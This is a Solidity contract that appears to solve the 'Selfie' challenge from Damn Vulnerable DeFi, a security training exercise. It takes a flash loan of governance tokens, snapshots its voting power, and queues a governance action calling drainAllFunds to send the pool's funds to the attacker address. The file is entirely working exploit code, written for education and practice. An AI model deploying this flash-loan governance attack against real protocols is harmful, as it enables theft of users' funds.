// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

/**
 * @title SelfieAttacker
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfieAttacker {

    using Address for address;

    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;
    SelfiePool public selfie;
    address public pwner;

    constructor(address tokenAddress, address governanceAddress, address selfieAddress, address _pwner) {
        token = DamnValuableTokenSnapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
        selfie = SelfiePool(selfieAddress);
        pwner = _pwner;
    }

    function pwn() external {
      selfie.flashLoan(1500000 * 1e18);
    }

    function receiveTokens(address _token, uint256 _amount) external {
      token.snapshot();
      governance.queueAction(
          address(selfie), 
          abi.encodeWithSignature("drainAllFunds(address)", pwner), 
          0
      );
      token.transfer(address(selfie), _amount);
    }
}